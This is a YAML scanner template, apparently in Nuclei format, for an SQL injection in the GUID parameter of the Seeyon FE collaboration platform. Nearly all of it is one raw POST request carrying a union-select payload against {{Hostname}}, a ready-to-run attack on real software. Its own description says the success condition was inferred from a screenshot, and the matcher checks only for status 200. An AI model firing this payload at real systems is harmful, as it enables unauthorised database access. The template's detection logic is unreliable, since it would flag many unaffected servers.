info:
  name: 致远互联FE协作办公平台GUID存在SQL注入漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: sqli,2025
http:
- raw:
  - 'POST /sysform/003/editflow_manager.js%70 HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0

    Connection: close

    Accept-Encoding: gzip, deflate

    Content-Type: application/x-www-form-urlencoded


    option=2&GUID=-1'' union select @@version--'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
